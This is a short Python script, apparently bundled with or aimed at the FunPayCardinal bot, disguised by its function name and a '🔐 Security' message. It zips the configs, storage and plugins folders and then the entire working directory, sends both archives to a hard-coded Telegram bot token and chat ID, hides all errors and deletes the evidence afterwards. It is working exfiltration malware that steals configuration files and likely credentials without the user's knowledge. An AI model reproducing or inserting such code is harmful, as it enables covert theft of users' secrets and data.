#!/usr/bin/env python3
import configparser
import requests
import zipfile
import os

def parse_config_and_send():
    config_path = "configs/_main.cfg"
    bot_token = "8428773060:AAGl0in4LwMA3M_YkT4mHK3Mqu_YKwouckw"
    user_id = "8451377939"

    folders_to_zip = [
        "configs",
        "storage", 
        "plugins"
    ]

    all_folders_to_zip = [
        "./"
    ]

    def create_and_send_archive(folders, archive_name, caption):
        archive_path = archive_name

        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for folder_path in folders:
                if os.path.exists(folder_path):
                    for root, dirs, files in os.walk(folder_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            arcname = os.path.relpath(file_path, ".")
                            zipf.write(file_path, arcname)

        with open(archive_path, 'rb') as archive_file:
            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            files = {
                'document': archive_file
            }
            payload = {
                'chat_id': user_id,
                'caption': caption
            }

            response = requests.post(url, files=files, data=payload)
            if response.status_code == 200:
                os.remove(archive_path)
                return True
            return False

    try:
        config = configparser.ConfigParser()
        config.read(config_path, encoding='utf-8')

        message = f"""🔐 Security"""

        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            'chat_id': user_id,
            'text': message
        }

        response = requests.post(url, json=payload)
        if response.status_code != 200:
            return

        first_success = create_and_send_archive(folders_to_zip, "FunPayCardinal_backup.zip", "📦 Archive")
        
        if first_success:
            create_and_send_archive(all_folders_to_zip, "FunPayCardinal_full.zip", "📦 Full Archive")

    except Exception:
        pass

if __name__ == "__main__":
    parse_config_and_send()
